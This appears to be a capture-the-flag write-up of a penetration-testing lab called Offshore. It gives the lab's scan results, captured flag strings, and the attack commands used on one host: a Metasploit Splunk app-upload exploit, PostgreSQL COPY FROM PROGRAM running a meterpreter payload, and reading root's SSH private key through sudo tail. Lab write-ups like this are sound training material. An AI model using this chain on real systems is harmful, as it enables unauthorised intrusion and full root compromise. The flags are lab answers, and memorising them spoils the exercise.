# Offshore

<figure><img src="../../../../.gitbook/assets/ic-offshore-overview.svg" alt=""><figcaption></figcaption></figure>

## Summary

* **Machines** - 21
* **Flags** - 38
* **Difficulty** - Advanced
* **Penetration Tester** - Level 3
* **Entry Point** - 10.10.110.0/24

## Entry Points

```bash
# Reachable Hosts & Ports
10.10.110.3
PORT    STATE SERVICE  REASON  VERSION
443/tcp open  ssl/http syn-ack nginx

10.10.110.123
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
8000/tcp open  http     syn-ack Splunkd httpd
8089/tcp open  ssl/http syn-ack Splunkd httpd (free license; remote login disabled)

10.10.110.124
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 10.0
```

## Flags

```
NIX01 - Just gettin' started - OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
```

## NIX01

### User - Mark

<pre class="language-bash"><code class="lang-bash"><strong>use exploit/multi/http/splunk_upload_app_exec
</strong>set target 1
run
python3 -c 'import pty;pty.spawn("/bin/bash")'
</code></pre>

### Privilege Escalation #1 - postgres

```bash
# Login to postgresql
/usr/local/pgsql/bin/psql -U postgres
# Command Execution run meterpreter shell
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '/dev/shm/shell.elf';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
# Flag
Wanna see some magic? - OFFSHORE{fun_w1th_m@g1k_bl0ck$}
```

### Privilege Escalastion #2 - root

```bash
# Read root private ssh key and save to id_rsa
sudo /usr/bin/tail -n 999 /root/.ssh/id_rsa
# Change id_rsa permissions
chmod 600 id_rsa
# Login as root
ssh root@$ip -i id_rsa

# Flag
I can see all things - OFFSHORE{st0p_tai1ing_m3_br0}
```
